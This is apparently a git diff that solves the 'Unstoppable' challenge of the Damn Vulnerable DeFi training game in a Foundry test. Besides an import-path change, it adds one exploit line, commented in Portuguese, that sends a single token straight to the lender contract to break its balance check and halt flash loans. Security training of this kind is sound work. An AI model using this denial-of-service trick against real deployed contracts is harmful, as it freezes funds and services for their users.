@@ -2,7 +2,7 @@
 pragma solidity >=0.8.0;
 
 import {Utilities} from "../../utils/Utilities.sol";
-import "forge-std/Test.sol";
+import "../../../lib/forge-std/src/Test.sol";
 
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {UnstoppableLender} from "../../../src/Contracts/unstoppable/UnstoppableLender.sol";
@@ -60,6 +60,8 @@ contract Unstoppable is Test {
         /**
          * EXPLOIT START *
          */
+        //1. colocar fundos no contrato unstoppableLender para quebrar a validação
+        dvt.transfer(address(unstoppableLender), 1);
         /**
          * EXPLOIT END *
          */
